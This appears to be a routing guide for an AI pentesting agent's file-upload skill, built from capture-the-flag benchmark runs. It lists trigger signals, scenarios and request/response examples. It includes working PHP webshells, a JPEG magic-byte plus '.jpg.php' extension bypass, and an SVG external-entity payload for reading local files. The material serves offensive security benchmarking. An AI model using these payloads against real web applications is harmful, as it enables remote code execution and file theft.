# insecure-file-uploads — when to use

## Trigger signals (dispatch this skill the moment you observe…)

- **Any HTML form with `enctype="multipart/form-data"` and a `<input type="file">`.** A page titled "Image Upload" / "Edit Profile" / "Article Submission" with a file field (`userfile`, `image`, `image_file`, `avatar`) → this skill applies immediately. This is the single most reliable tell in the whole class — every passing upload benchmark started from exactly this markup. *(XBEN-041, XBEN-067, XBEN-077, XBEN-028)*
- **An upload that echoes back the stored path of the file you just sent.** A response containing `File is valid, and was successfully uploaded` plus a link/`<img>` to `upload/<yourfilename>` → the upload directory is web-reachable; dispatch and immediately try to fetch the file back. If the stored name keeps your extension, server-side execution is one step away. *(XBEN-041, XBEN-067)*
- **A file extension/MIME validator that talks back to you.** A rejection string like `Invalid Image file. We only support JPG files.` or `Error uploading file!` → the server enforces a file-type allow-list, which is the exact thing this skill exists to bypass (magic-byte prefix + double extension + content-type spoof). A *talking* validator is a stronger signal than a silent one. *(XBEN-067)*
- **The uploaded file is reflected/rendered back into the response body.** When your uploaded SVG/HTML/XML appears inside the page (e.g. a "Current Image:" block that inlines your `<svg>...</svg>`), the upload feeds a parser whose output you can read → SVG-XXE / stored-XSS via upload. If an SVG with an external entity referencing a local file renders that file's contents, this skill confirms. *(XBEN-077)*
- **A recon link or directory-bust hit naming an upload route.** A homepage `<a href="posts/upload-article.php">`, or gobuster finding `/upload.php`, `/upload/`, `sku_import.php`, `sku_read` → dispatch this skill to probe the route even before you see the form. *(XBEN-028, XBEN-029, XBEN-092)*
- **An upload/import endpoint that names a serialized/archive format.** A JSON error `{"status":"failure","message":"Phar file not found."}`, or an endpoint expecting `.phar` / `.ser` / `.pkl` → an upload-then-deserialize chain. Dispatch this skill for the *upload half* (get crafted bytes onto disk) even when the deserialization specialist owns the trigger half. *(XBEN-092)*
- **A PHP/Apache app (`X-Powered-By: PHP`, `Server: Apache`) with a writable upload directory.** PHP + Apache + a reachable `upload/` is the canonical webshell-via-upload target: drop a `.php`/`.phtml` file, fetch it, get RCE. *(XBEN-041, XBEN-067, XBEN-028)*
- **A challenge hint that says "Check environment variables."** When the target tells you the flag lives in an env var, the implied win is upload → code execution → `getenv()`/`printenv`. The env-var hint is itself a routing signal toward this skill. *(XBEN-041, XBEN-067)*

## Use-case scenarios

- **PHP webshell via permissive upload (the dominant easy case).** A PHP/Apache "Image Upload" form that accepts a file, stores it under a web-served `upload/` directory, and keeps your chosen extension. The move: upload a `.php` (or `.phtml`/`.php5`) file containing `<?php system($_GET['x']); ?>`, fetch `http://target/upload/shell.php?x=...`, and run commands. The flag is then read with `cat /flag.txt` or, when hinted, `getenv()`/`printenv` (env-var flag). *(XBEN-041 won this way; XBEN-028 won the same way through `posts/upload-article.php` → `posts/uploads/cmd.php`.)*
- **Bypassing a file-type allow-list (the "medium" case).** When the validator enforces JPG (checks both magic bytes AND extension), the surface is identical but needs a bypass. The technique that *worked* in the data: a file that begins with real JPEG structure (`FF D8 FF E0 ... JFIF`) so the structure check passes, but whose **final** extension is `.php` (e.g. `shell.jpg.php`) so Apache executes it. The combination must satisfy the validator *and* land an executable extension — getting only one of the two is the common failure. *(XBEN-067)*
- **SVG / XML upload as an XXE or stored-XSS sink.** Apps that accept "profile image" uploads in SVG and render them back without sanitisation are XXE targets: an uploaded SVG declaring an external entity (`<!ENTITY xxe SYSTEM "file:///app/flag.txt">`) and printing `&xxe;` will render the file contents straight into the page. Use this skill whenever an upload feeds a markup/XML parser whose output is reflected to you. *(XBEN-077)*
- **Upload as the delivery half of a multi-step chain.** Several benchmarks pair `arbitrary_file_upload` with another class: behind a SQLi login (XBEN-029), in front of an LFI include (XBEN-028), or feeding PHAR deserialization (XBEN-092). In all of these the upload is a *prerequisite or vehicle*, not the whole exploit. Dispatch this skill to own getting crafted bytes onto the server, and coordinate with the SQLi / LFI / deserialization specialist for the trigger.
- **Upload gated behind authentication.** When `upload.php` / `dashboard` returns `302 → index.php?error=failed_login`, the upload surface exists but is locked. This is still a file-upload signal — note it, and route the auth/SQLi work first; the upload skill becomes live the moment a valid session exists. *(XBEN-029)*

## Concrete tells (request → response examples)

- **Permissive PHP upload.** `POST /index.php` with `userfile=@shell.php;type=image/png` → response: `File is valid, and was successfully uploaded <a href='upload/shell.php'>here</a>.` Then `GET /upload/shell.php?x=id` executes PHP (`<?php echo 123; ?>` returned `123`). The fact that a `.txt`/`.php` file is accepted despite an "image upload" UI proves no real type enforcement. *(XBEN-041 in the 1_full_run)*
- **Webshell reads env-var flag.** Upload `<?php foreach($_ENV as $k=>$v) echo "$k=$v"; ?>` (or use `getenv`), then GET it → body contains `cwd=/var/www/html/upload` and `ENVFLAG=FLAG{...}`. Matches a "Check environment variables" hint. *(XBEN-041)*
- **Allow-list rejection then bypass.** `POST` a `.php` file → `Invalid Image file. We only support JPG files.` Upload `shell.jpg.php` with body `FFD8FFE0...JFIF<?php system($_GET['cmd']); ?>` → accepted, and `GET /upload/shell.jpg.php?cmd=id` returns `RCE_MARKER:` followed by command output. Contrast the failing variant `shell.php.jpg`: accepted, but `GET` returns `Content-Type: image/jpeg` with the **raw PHP source uninterpreted** (served as a static image, no execution). *(XBEN-067 — `.jpg.php` won in 1_full_run; `.php.jpg` failed in the 06-06 run.)*
- **SVG-XXE local file read.** Upload `image=@xxe.svg` where `xxe.svg` is `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]><svg ...><text>&xxe;</text></svg>` → the response's "Current Image:" block renders `<svg ...><text x="1" y="20">flag{...}</text></svg>`, i.e. the file contents substituted for the entity. A benign-entity probe (`<!ENTITY xxe "MARKER">`) rendering `MARKER` first confirms the parser resolves entities. *(XBEN-077)*
- **PHP webshell behind an article-upload route.** `POST /posts/upload-article.php` with a `.php` file → it lands in `/posts/uploads/`; `GET /posts/uploads/cmd.php?x=cat%20/FLAG.txt` returns `FLAG{...}`. *(XBEN-028)*
- **Phar/import endpoint.** Probing `sku_read` returns `{"status":"failure","message":"Phar file not found."}` — an explicit signal that an upload-then-`phar://` chain exists; `upload.php` and `sku_import.php` were also enumerated on the same app. *(XBEN-092)*

## When NOT to use it / easily-confused-with

- **An upload accepted does NOT mean code executed — verify by fetching it back.** The defining XBEN-067 failure was uploading `shell.php.jpg`, seeing "successfully uploaded", and assuming RCE — but `GET` of the stored file returned `Content-Type: image/jpeg` with the PHP **uninterpreted**. The skill's job is not done until a fetched upload proves execution (a marker like `RCE_MARKER:`/`uid=` in the body), not just storage. Final extension and the server's handler mapping decide execution, not acceptance. *(XBEN-067)*
- **A reflected upload is XSS/XXE depending on what the parser does, not "upload RCE".** An SVG reflected into HTML is stored-XSS *unless* the XML parser resolves external entities into local-file reads (then it is XXE). Do not jump to webshell/RCE on a reflected-markup upload; confirm whether the bytes are *executed as code* or merely *rendered*. *(XBEN-077 was XXE, not a PHP webshell.)*
- **If the upload route is gated behind login, this is not yet your turn.** A `302 → ?error=failed_login` on `upload.php` means the auth/SQLi specialist must succeed first. Routing the upload skill while the login is unsolved burns budget — note the upload surface and wait. The XBEN-029 miss was an unsolved boolean-blind-SQLi login (oracle: `{"response":"username"}` vs `{"response":"password"}`) that locked the upload behind it, so the upload skill never became applicable. *(XBEN-029)*
- **An upload that names a serialization format is the deserialization skill's trigger, even though the bytes arrive via upload.** A `pickle_file` field, a `.phar`/`.ser`/`.pkl` expectation, or a `Phar file not found.` error means the *sink* is `unserialize()`/`pickle.loads()`/PHAR, not extension-bypass-to-webshell. Use this skill to own the file-landing step, but coordinate with `deserialization` for the gadget/trigger — and don't let a louder SSRF/SSTI lead crowd out the upload half (that is exactly what lost XBEN-092). *(XBEN-092)*
- **A "controlled-ssrf-oracle" / AirTunes-style host service is a distraction, not the upload surface.** When the target's web app resets connections, the swarm tends to wander onto co-located host ports (`4455`/`8765` returning `controlled-ssrf-oracle`; macOS AirPlay on `5000`/`7000` answering `AirTunes/920.10.1`). These are NOT the upload target — stay on the real app's `Image Upload` form. *(XBEN-041 06-06 run and XBEN-028 both burned long detours here before refocusing.)*
